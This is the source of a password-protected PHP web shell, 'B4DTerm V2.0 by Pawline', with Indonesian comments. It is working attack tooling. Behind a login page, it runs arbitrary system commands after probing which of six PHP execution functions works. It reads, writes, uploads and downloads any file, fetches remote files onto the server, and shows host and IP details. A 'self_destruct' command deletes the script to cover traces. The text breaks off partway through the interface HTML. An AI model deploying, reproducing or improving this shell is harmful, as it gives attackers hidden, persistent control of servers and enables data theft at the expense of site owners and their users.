<?php
session_start();
error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

// Konfigurasi Hash (Strict)
$h = '$2y$10$hV98QcCsi2h0xSFSzOOSJuccQTZWjSzydYET4dxZIY0sKHsiFtQyG';

if (isset($_GET['bye'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Auth Logic
if (!isset($_SESSION['l']) || !$_SESSION['l']) {
    if (isset($_POST['p'])) {
        if (password_verify($_POST['p'], $h)) {
            $_SESSION['l'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
    }
    // Custom Polished Login Page (Sesuai request)
    die("<!DOCTYPE html><html class='dark'><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>B4DTerm Login</title><script src='https://cdn.tailwindcss.com'></script><style>.bg-terminal{background-color:#000}.border-terminal{border-color:#27272a}.text-accent{color:#10b981}.font-mono{font-family:monospace}</style></head><body class='bg-neutral-950 h-screen flex justify-center items-center font-mono text-xs'><div class='terminal-window bg-terminal border border-terminal rounded-xl shadow-2xl p-6 w-full max-w-sm'><div class='flex items-center gap-2 mb-4 border-b pb-2 border-neutral-800'><div class='w-2 h-2 rounded-full bg-red-500'></div><div class='w-2 h-2 rounded-full bg-yellow-500'></div><div class='w-2 h-2 rounded-full bg-emerald-500'></div><span class='font-bold text-gray-200 ml-2'>B4DTerm</span><span class='text-gray-600 ml-auto'>© Pawline</span></div><div class='text-center mb-6'><h1 class='text-lg font-bold text-accent'>SECURE ACCESS</h1><p class='text-gray-500'>Authentication Required</p></div><form method='post' class='space-y-4'><div class='relative'><span class='absolute left-3 top-1/2 -translate-y-1/2 text-accent font-bold'>$</span><input type='password' name='p' class='w-full bg-neutral-900 border border-neutral-800 text-white pl-7 pr-4 py-2 rounded focus:outline-none focus:border-accent placeholder-neutral-600 text-sm tracking-wide' placeholder='' autofocus></div><button type='submit' class='w-full bg-accent/20 border border-accent/30 text-accent py-2 rounded text-sm font-semibold hover:bg-accent/30 transition-colors'>Gaskeun</button></form><div class='mt-6 text-center text-neutral-600 text-[10px]'>ACCESS AT YOUR OWN RISK</div></div></body></html>");
}

if (!isset($_SESSION['d'])) $_SESSION['d'] = getcwd();

// Fungsi untuk mendapatkan list file
function get_file_list($dir) {
    $files = [];
    if (is_dir($dir)) {
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item != '.' && $item != '..') {
                $fullPath = $dir . '/' . $item;
                $files[] = [
                    'name' => $item,
                    'is_dir' => is_dir($fullPath),
                    'size' => is_file($fullPath) ? filesize($fullPath) : 0,
                    'modified' => filemtime($fullPath)
                ];
            }
        }
    }
    // Urutkan berdasarkan modified time (terbaru dulu)
    usort($files, function($a, $b) {
        return $b['modified'] - $a['modified'];
    });
    return $files;
}

// Fungsi untuk render breadcrumb dengan folder steps
function render_breadcrumb($path) {
    $parts = explode('/', trim($path, '/'));
    $output = '';
    
    // Jika path root atau kosong
    if (empty($parts[0])) {
        return '<span class="text-emerald-300">/</span>';
    }
    
    foreach ($parts as $index => $part) {
        if ($part === '') continue;
        
        if ($index > 0) {
            $output .= '<span class="text-gray-600 mx-1"><i class="fas fa-chevron-right text-[8px]"></i></span>';
        }
        
        // Untuk home directory, gunakan icon home
        if ($index === 0 && $part === 'home') {
            $output .= '<span class="text-emerald-300 hover:text-emerald-200 transition-colors flex items-center gap-1">';
            $output .= '<i class="fas fa-home text-xs"></i>';
            $output .= '<span>' . htmlspecialchars($part) . '</span>';
            $output .= '</span>';
        } else {
            $output .= '<span class="text-emerald-300 hover:text-emerald-200 transition-colors">' . htmlspecialchars($part) . '</span>';
        }
    }
    
    return $output;
}

// Fungsi untuk format size
function format_size($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return $bytes . ' byte';
    } else {
        return '0 bytes';
    }
}

if (isset($_GET['get'])) {
    $f = $_SESSION['d'] . '/' . $_GET['get'];
    if (file_exists($f)) {
        $filename = $_GET['saveas'] ?? basename($f);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$filename.'"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }
}

// Fungsi untuk membaca file
if (isset($_POST['readfile'])) {
    $file = $_SESSION['d'] . '/' . $_POST['readfile'];
    if (file_exists($file) && is_file($file)) {
        $content = file_get_contents($file);
        echo json_encode(['success' => true, 'content' => $content]);
    } else {
        echo json_encode(['success' => false, 'error' => 'File not found']);
    }
    exit;
}

// Fungsi untuk menulis file
if (isset($_POST['writefile'])) {
    $file = $_SESSION['d'] . '/' . $_POST['writefile'];
    $content = $_POST['content'];
    if (file_put_contents($file, $content) !== false) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Write failed']);
    }
    exit;
}

// Fungsi untuk upload dari URL
if (isset($_POST['url_upload'])) {
    $url = $_POST['url'];
    $filename = $_POST['url_filename'] ?? basename($url);
    
    // Validasi URL
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        echo json_encode(['success' => false, 'error' => 'Invalid URL']);
        exit;
    }
    
    $filepath = $_SESSION['d'] . '/' . $filename;
    
    // Download file dari URL
    $content = @file_get_contents($url);
    if ($content !== false && file_put_contents($filepath, $content) !== false) {
        echo json_encode(['success' => true, 'path' => $filepath, 'size' => strlen($content)]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Download failed']);
    }
    exit;
}

// Fungsi untuk get IP info
if (isset($_POST['get_ip_info'])) {
    $client_ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $server_ip = $_SERVER['SERVER_ADDR'];
    $hostname = gethostname();
    
    echo json_encode([
        'success' => true,
        'client_ip' => $client_ip,
        'server_ip' => $server_ip,
        'hostname' => $hostname
    ]);
    exit;
}

// FUNGSI PROBING METHOD YANG DIUPGRADE
function _probe_method() {
    $methods = [
        'shell_exec',
        'exec',
        'passthru',
        'system',
        'popen',
        'proc_open'
    ];
    
    foreach ($methods as $method) {
        if (function_exists($method)) {
            if ($method === 'shell_exec') {
                $test = @shell_exec('echo test');
                if ($test !== false && trim($test) === 'test') {
                    return $method;
                }
            } elseif ($method === 'exec') {
                $output = null;
                $result = @exec('echo test', $output);
                if ($result !== false && isset($output[0]) && $output[0] === 'test') {
                    return $method;
                }
            } elseif ($method === 'passthru') {
                return $method;
            } elseif ($method === 'system') {
                ob_start();
                $result = @system('echo test', $return_var);
                $output = ob_get_clean();
                if ($result !== false && trim($output) === 'test') {
                    return $method;
                }
            } elseif ($method === 'popen') {
                $handle = @popen('echo test', 'r');
                if ($handle !== false) {
                    $output = fread($handle, 1024);
                    pclose($handle);
                    if (trim($output) === 'test') {
                        return $method;
                    }
                }
            } elseif ($method === 'proc_open') {
                $descriptorspec = [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ];
                
                $process = @proc_open('echo test', $descriptorspec, $pipes);
                if (is_resource($process)) {
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[0]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                    
                    if (trim($output) === 'test') {
                        return $method;
                    }
                }
            }
        }
    }
    
    return 'none';
}

// FUNGSI EKSEKUSI COMMAND YANG DIUPGRADE
function execute_command($command) {
    $method = _probe_method();
    $output = '';
    $success = false;
    
    if ($method === 'none') {
        return ['output' => '', 'method' => 'none', 'success' => false];
    }
    
    chdir($_SESSION['d']);
    
    if (strpos($command, '2>&1') === false && strpos($command, '2>') === false) {
        $command .= ' 2>&1';
    }
    
    switch ($method) {
        case 'shell_exec':
            $output = @shell_exec($command);
            $success = ($output !== false && $output !== null);
            break;
            
        case 'exec':
            $result_array = [];
            $last_line = @exec($command, $result_array, $return_var);
            $output = implode("\n", $result_array);
            $success = ($return_var === 0);
            break;
            
        case 'passthru':
            ob_start();
            @passthru($command, $return_var);
            $output = ob_get_clean();
            $success = ($return_var === 0);
            break;
            
        case 'system':
            ob_start();
            $last_line = @system($command, $return_var);
            $output = ob_get_clean();
            $success = ($return_var === 0);
            break;
            
        case 'popen':
            $handle = @popen($command, 'r');
            if ($handle) {
                while (!feof($handle)) {
                    $output .= fread($handle, 4096);
                }
                $return_var = pclose($handle);
                $success = ($return_var === 0);
            } else {
                $success = false;
            }
            break;
            
        case 'proc_open':
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            
            $process = @proc_open($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                fclose($pipes[0]);
                
                $output = stream_get_contents($pipes[1]);
                $error = stream_get_contents($pipes[2]);
                
                fclose($pipes[1]);
                fclose($pipes[2]);
                
                $return_var = proc_close($process);
                
                if (empty($output) && !empty($error)) {
                    $output = $error;
                }
                
                $success = ($return_var === 0);
            } else {
                $success = false;
            }
            break;
            
        default:
            $output = "No execution method available";
            $success = false;
    }
    
    if ($output === false) $output = '';
    if ($output === null) $output = '';
    
    return [
        'output' => $output,
        'method' => $method,
        'success' => $success
    ];
}

if (isset($_POST['k'])) {
    header('Content-Type: application/json');
    $c = trim($_POST['k']);
    $r = ['o' => '', 'd' => $_SESSION['d'], 'm' => 'none', 's' => false, 'e' => false];

    if ($c === 'self_destruct') {
        if (unlink(__FILE__)) {
            $r['o'] = "System destroyed.";
            session_destroy();
        } else {
            $r['o'] = "Destruct failed.";
            $r['e'] = true;
        }
        echo json_encode($r);
        exit;
    }

    if (strpos($c, 'cd ') === 0) {
        $n = substr($c, 3);
        $old_dir = $_SESSION['d'];
        chdir($_SESSION['d']);
        if (@chdir($n)) {
            $new_dir = getcwd();
            $_SESSION['d'] = $new_dir;
            $r['d'] = $_SESSION['d'];
            $r['o'] = "Direktori berubah:\n" .
                      "  Dari: " . $old_dir . "\n" .
                      "  Ke:   " . $new_dir;
        } else {
            $r['o'] = "Error: Path tidak ditemukan - " . $n; 
            $r['e'] = true;
        }
        echo json_encode($r);
        exit;
    }

    $result = execute_command($c);
    
    $r['o'] = $result['output'];
    $r['m'] = $result['method'];
    $r['s'] = $result['success'];
    $r['e'] = !$result['success'];
    
    if (empty($r['o']) && $r['s'] && !$r['e']) {
        $r['o'] = "✓ Command executed successfully (no output)";
    }
    
    echo json_encode($r);
    exit;
}

if (isset($_FILES['f'])) {
    $t = $_SESSION['d'] . '/' . basename($_FILES['f']['name']);
    $s = move_uploaded_file($_FILES['f']['tmp_name'], $t);
    echo json_encode(['s' => $s, 'path' => $t]);
    exit;
}

$probe = _probe_method();
$file_list = get_file_list($_SESSION['d']);
?>
<!DOCTYPE html>
<html lang="id" class="dark">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>B4DTerm by Pawline</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap');

::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:#333;border-radius:2px}
.g{background:rgba(10,10,10,0.9);backdrop-filter:blur(10px)}
.modal{background:rgba(0,0,0,0.8);backdrop-filter:blur(5px)}
.quick-scroll{display:flex;overflow-x:auto;gap:6px;padding:8px}
.quick-scroll::-webkit-scrollbar{height:3px}
.output-bg{
    background-image:url('https://mfiles.alphacoders.com/101/thumb-1920-1012645.png');
    background-size:cover;
    background-position:center;
    background-attachment:fixed;
    position:absolute;
    inset:0;
}
.output-content{
    background:rgba(0,0,0,0.75);
    backdrop-filter:blur(4px);
    position:absolute;
    inset:0;
}
body {
    font-family: 'JetBrains Mono', monospace;
}
.file-item {
    transition: all 0.2s ease;
}
.file-item:hover {
    background: rgba(255,255,255,0.05);
    transform: translateX(2px);
}
.modal-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
    gap: 8px;
    max-height: 200px;
    overflow-y: auto;
}

/* Custom styles untuk breadcrumb */
.breadcrumb-container {
    -ms-overflow-style: none;
    scrollbar-width: none;
}
.breadcrumb-container::-webkit-scrollbar {
    display: none;
}

.php-badge {
    background: linear-gradient(135deg, rgba(119, 77, 143, 0.2) 0%, rgba(77, 57, 143, 0.1) 100%);
    border: 1px solid rgba(139, 92, 246, 0.3);
}

/* Responsive adjustments */
@media (max-width: 640px) {
    .terminal-window {
        border-radius: 0.75rem;
    }
    .quick-scroll {
        padding: 6px;
        gap: 4px;
    }
    .quick-scroll button {
        padding: 6px 10px;
        font-size: 10px;
    }
    .breadcrumb-text {
        font-size: 11px;
    }
    .php-version {
        font-size: 10px;
        padding: 4px 8px;
    }
}
</style>
</head>
<body class="bg-neutral-950 flex items-center justify-center h-[100dvh] p-2 sm:p-6 text-gray-400 overflow-hidden" style="font-family: 'JetBrains Mono', monospace;">

<!-- ===== MODAL CREATE FOLDER ===== -->
<div id="createFolderModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-blue-500/30 rounded-xl w-full max-w-md flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-blue-500/30 bg-blue-900/10">
            <h3 class="text-blue-400 font-bold text-sm"><i class="fas fa-folder-plus mr-2"></i>Create New Folder</h3>
            <button onclick="closeCreateFolderModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-folder mr-1"></i>Folder Name:</label>
                <input type="text" id="folderNameInput" class="w-full bg-neutral-900 border border-blue-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="nama_folder" autofocus>
            </div>
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-location-dot mr-1"></i>Current Path:</label>
                <div class="text-gray-300 text-xs bg-neutral-900/50 p-2 rounded border border-blue-500/20"><?= $_SESSION['d'] ?></div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-blue-500/30 bg-blue-900/10">
            <button onclick="createFolderSubmit()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-500 flex-1 text-sm"><i class="fas fa-check mr-2"></i>Create</button>
            <button onclick="closeCreateFolderModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
    </div>
</div>

<!-- ===== MODAL CREATE FILE ===== -->
<div id="createFileModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-green-500/30 rounded-xl w-full max-w-md flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-green-500/30 bg-green-900/10">
            <h3 class="text-green-400 font-bold text-sm"><i class="fa-regular fa-file mr-2"></i>Create New File</h3>
            <button onclick="closeCreateFileModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-green-400 text-xs block mb-1"><i class="fas fa-file mr-1"></i>File Name:</label>
                <input type="text" id="fileNameInput" class="w-full bg-neutral-900 border border-green-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="file_name.ext" autofocus>
            </div>
            <div>
                <label class="text-green-400 text-xs block mb-1"><i class="fas fa-align-left mr-1"></i>Initial Content (Optional):</label>
                <textarea id="fileContentInput" class="w-full bg-neutral-900 border border-green-500/30 rounded px-3 py-2 text-white text-sm h-24 resize-none placeholder-gray-500" placeholder="Isi file..."></textarea>
            </div>
            <div>
                <label class="text-green-400 text-xs block mb-1"><i class="fas fa-location-dot mr-1"></i>Current Path:</label>
                <div class="text-gray-300 text-xs bg-neutral-900/50 p-2 rounded border border-green-500/20"><?= $_SESSION['d'] ?></div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-green-500/30 bg-green-900/10">
            <button onclick="createFileSubmit()" class="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-500 flex-1 text-sm"><i class="fas fa-check mr-2"></i>Create</button>
            <button onclick="closeCreateFileModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
    </div>
</div>

<!-- ===== MODAL RENAME ===== -->
<div id="renameModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-purple-500/30 rounded-xl w-full max-w-2xl flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-purple-500/30 bg-purple-900/10">
            <h3 class="text-purple-400 font-bold text-sm"><i class="fas fa-edit mr-2"></i>Rename File/Folder</h3>
            <button onclick="closeRenameModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div class="flex gap-3">
                <div class="flex-1">
                    <label class="text-purple-400 text-xs block mb-1"><i class="fas fa-file mr-1"></i>Select File/Folder:</label>
                    <div class="modal-grid p-2 bg-neutral-900/50 border border-purple-500/20 rounded max-h-40 overflow-y-auto">
                        <?php foreach ($file_list as $file): ?>
                        <div class="file-item cursor-pointer p-2 rounded border border-transparent hover:border-purple-500/30 hover:bg-purple-900/20" onclick="selectFileForRename('<?= htmlspecialchars($file['name']) ?>')">
                            <div class="flex items-center gap-2">
                                <i class="fas <?= $file['is_dir'] ? 'fa-folder text-yellow-400' : 'fa-file text-blue-400' ?> text-xs"></i>
                                <span class="text-gray-300 text-xs truncate"><?= htmlspecialchars($file['name']) ?></span>
                            </div>
                            <div class="text-gray-500 text-[10px] mt-1">
                                <?= $file['is_dir'] ? 'DIR' : format_size($file['size']) ?>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <div class="flex-1 space-y-3">
                    <div>
                        <label class="text-purple-400 text-xs block mb-1"><i class="fas fa-pen mr-1"></i>Current Name:</label>
                        <input type="text" id="renameOldName" class="w-full bg-neutral-900 border border-purple-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="Select file/folder from list" readonly>
                    </div>
                    <div>
                        <label class="text-purple-400 text-xs block mb-1"><i class="fas fa-signature mr-1"></i>New Name:</label>
                        <input type="text" id="renameNewName" class="w-full bg-neutral-900 border border-purple-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="nama_baru.ext">
                    </div>
                </div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-purple-500/30 bg-purple-900/10">
            <button onclick="renameSubmit()" class="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-500 flex-1 text-sm"><i class="fas fa-check mr-2"></i>Rename</button>
            <button onclick="closeRenameModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
    </div>
</div>

<!-- ===== MODAL EDIT ===== -->
<div id="editModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-yellow-500/30 rounded-xl w-full max-w-4xl h-[80vh] flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-yellow-500/30 bg-yellow-900/10">
            <h3 class="text-yellow-400 font-bold text-sm"><i class="fas fa-edit mr-2"></i>Edit File</h3>
            <button onclick="closeEditModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="flex-1 p-4 flex gap-3">
            <div class="w-1/3">
                <div class="text-yellow-400 text-xs mb-2"><i class="fas fa-file mr-1"></i>Select File to Edit:</div>
                <div class="modal-grid p-2 bg-neutral-900/50 border border-yellow-500/20 rounded h-full max-h-[60vh] overflow-y-auto">
                    <?php foreach ($file_list as $file): ?>
                        <?php if (!$file['is_dir']): ?>
                        <div class="file-item cursor-pointer p-2 rounded border border-transparent hover:border-yellow-500/30 hover:bg-yellow-900/20" onclick="selectFileForEdit('<?= htmlspecialchars($file['name']) ?>')">
                            <div class="flex items-center gap-2">
                                <i class="fas fa-file text-blue-400 text-xs"></i>
                                <span class="text-gray-300 text-xs truncate"><?= htmlspecialchars($file['name']) ?></span>
                            </div>
                            <div class="text-gray-500 text-[10px] mt-1">
                                <?= format_size($file['size']) ?> • <?= date('H:i', $file['modified']) ?>
                            </div>
                        </div>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </div>
            </div>
            <div class="w-2/3 flex flex-col">
                <div class="mb-3">
                    <input type="text" id="editFileName" class="w-full bg-neutral-900 border border-yellow-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="Nama file..." readonly>
                </div>
                <textarea id="editFileContent" class="flex-1 w-full bg-neutral-900 border border-yellow-500/30 rounded px-3 py-2 text-white text-sm resize-none placeholder-gray-500" placeholder="Konten file..."></textarea>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-yellow-500/30 bg-yellow-900/10">
            <button onclick="saveFile()" class="bg-yellow-600 text-white px-4 py-2 rounded hover:bg-yellow-500 flex-1 text-sm"><i class="fas fa-save mr-2"></i>Save File</button>
            <button onclick="closeEditModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
    </div>
</div>

<!-- ===== MODAL UPLOAD DARI URL ===== -->
<div id="urlUploadModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-blue-500/30 rounded-xl w-full max-w-2xl flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-blue-500/30 bg-blue-900/10">
            <h3 class="text-blue-400 font-bold text-sm"><i class="fas fa-cloud-download-alt mr-2"></i>Upload dari URL</h3>
            <button onclick="closeUrlUploadModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-link mr-1"></i>URL File:</label>
                <input type="text" id="urlInput" class="w-full bg-neutral-900 border border-blue-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="https://example.com/file.zip">
            </div>
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-save mr-1"></i>Simpan sebagai (opsional):</label>
                <input type="text" id="urlFilename" class="w-full bg-neutral-900 border border-blue-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="nama_file.ext">
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-blue-500/30 bg-blue-900/10">
            <button onclick="startUrlUpload()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-500 flex-1 text-sm"><i class="fas fa-download mr-2"></i>Download</button>
            <button onclick="closeUrlUploadModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Batal</button>
        </div>
    </div>
</div>

<!-- ===== MODAL DOWNLOAD DENGAN NAMA CUSTOM ===== -->
<div id="downloadModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-cyan-500/30 rounded-xl w-full max-w-2xl flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-cyan-500/30 bg-cyan-900/10">
            <h3 class="text-cyan-400 font-bold text-sm"><i class="fas fa-file-download mr-2"></i>Download File</h3>
            <button onclick="closeDownloadModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-cyan-400 text-xs block mb-1"><i class="fas fa-file mr-1"></i>File yang akan didownload:</label>
                <input type="text" id="downloadFile" class="w-full bg-neutral-900 border border-cyan-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="nama_file.ext">
            </div>
            <div>
                <label class="text-cyan-400 text-xs block mb-1"><i class="fas fa-edit mr-1"></i>Simpan sebagai:</label>
                <input type="text" id="downloadAs" class="w-full bg-neutral-900 border border-cyan-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="nama_custom.extensi_apa_saja">
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-cyan-500/30 bg-cyan-900/10">
            <button onclick="startCustomDownload()" class="bg-cyan-600 text-white px-4 py-2 rounded hover:bg-cyan-500 flex-1 text-sm"><i class="fas fa-download mr-2"></i>Download</button>
            <button onclick="closeDownloadModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Batal</button>
        </div>
    </div>
</div>

<!-- ===== MODAL IP INFO ===== -->
<div id="ipModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-purple-500/30 rounded-xl w-full max-w-2xl flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-purple-500/30 bg-purple-900/10">
            <h3 class="text-purple-400 font-bold text-sm"><i class="fas fa-network-wired mr-2"></i>Informasi IP</h3>
            <button onclick="closeIpModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div class="bg-neutral-900/50 p-3 rounded border border-purple-500/20">
                <div class="text-purple-400 text-xs mb-1"><i class="fas fa-desktop mr-1"></i>IP Address Anda:</div>
                <div id="clientIp" class="text-white font-bold text-sm">Memuat...</div>
            </div>
            <div class="bg-neutral-900/50 p-3 rounded border border-purple-500/20">
                <div class="text-purple-400 text-xs mb-1"><i class="fas fa-server mr-1"></i>IP Server:</div>
                <div id="serverIp" class="text-white font-bold text-sm">Memuat...</div>
            </div>
            <div class="bg-neutral-900/50 p-3 rounded border border-purple-500/20">
                <div class="text-purple-400 text-xs mb-1"><i class="fas fa-computer mr-1"></i>Hostname:</div>
                <div id="hostname" class="text-white font-bold text-sm">Memuat...</div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-purple-500/30 bg-purple-900/10">
            <button onclick="closeIpModal()" class="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-500 flex-1 text-sm"><i class="fas fa-check mr-2"></i>Tutup</button>
        </div>
    </div>
</div>

<div class="terminal-window bg-black border border-neutral-800 rounded-xl shadow-2xl flex flex-col w-full max-w-7xl h-full sm:h-[90dvh]">

    <header class="h-10 border-b border-white/10 flex items-center justify-between px-3 bg-neutral-900/50 shrink-0 rounded-t-xl">
        <div class="flex items-center gap-2">
            <div class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
            <span class="font-bold text-gray-200 text-sm">B4DTerm V2.0</span> <span class="text-xs text-gray-600">© Pawline</span>
        </div>
        <div class="flex gap-3">
            <span class="text-gray-600 hidden sm:block text-xs"><?= php_uname('s') ?></span>
            <a href="?bye" class="text-red-500 hover:text-red-400 font-bold text-xs"><i class="fas fa-sign-out-alt mr-1"></i>Keluar</a>
        </div>
    </header>

    <main id="tm" class="flex-1 overflow-hidden relative flex flex-col">
        <div class="output-bg"></div>
        <div class="output-content"></div>
        <div id="out" class="flex-1 overflow-y-auto overflow-x-hidden p-4 space-y-1 relative z-10">
            <div class="text-gray-600 mb-4 text-xs">PID: <?= getmypid() ?></div>
            <div id="status" class="text-emerald-500 font-semibold text-xs mb-2"></div>
        </div>
    </main>

    <footer class="bg-black border-t border-white/10 z-20 shrink-0 rounded-b-xl">
        <div id="up" class="hidden bg-neutral-900 p-2 border-b border-white/5 flex gap-2">
            <input type="file" id="fi" class="w-full text-xs text-gray-400 file:bg-emerald-900 file:text-emerald-400 file:border-0 file:px-2 file:py-1 file:rounded cursor-pointer">
            <button id="ub" class="bg-emerald-600 text-white px-3 py-1 rounded hover:bg-emerald-500 text-xs"><i class="fas fa-upload mr-1"></i>Upload</button>
            <button onclick="openUrlUploadModal()" class="bg-blue-600 text-white px-3 py-1 rounded hover:bg-blue-500 text-xs"><i class="fas fa-cloud-download-alt mr-1"></i>Dari URL</button>
        </div>

        <div class="quick-scroll bg-neutral-900/50">
            <!-- File Operations -->
            <button onclick="x('ls -la --color=never')" class="px-3 py-2 bg-green-900/30 hover:bg-green-900/50 border border-green-500/30 rounded text-green-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-list w-3"></i><span>List</span></button>
            <button onclick="openCreateFolderModal()" class="px-3 py-2 bg-blue-900/30 hover:bg-blue-900/50 border border-blue-500/30 rounded text-blue-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-folder-plus w-3"></i><span>Folder</span></button>
            <button onclick="openCreateFileModal()" class="px-3 py-2 bg-green-900/30 hover:bg-green-900/50 border border-green-500/30 rounded text-green-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fa-regular fa-file w-3"></i><span>File</span></button>
            <button onclick="openRenameModal()" class="px-3 py-2 bg-purple-900/30 hover:bg-purple-900/50 border border-purple-500/30 rounded text-purple-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-edit w-3"></i><span>Rename</span></button>
            <button onclick="openEditModal()" class="px-3 py-2 bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-500/30 rounded text-yellow-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-edit w-3"></i><span>Edit</span></button>
            <button onclick="openDownloadModal()" class="px-3 py-2 bg-cyan-900/30 hover:bg-cyan-900/50 border border-cyan-500/30 rounded text-cyan-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-download w-3"></i><span>Download</span></button>
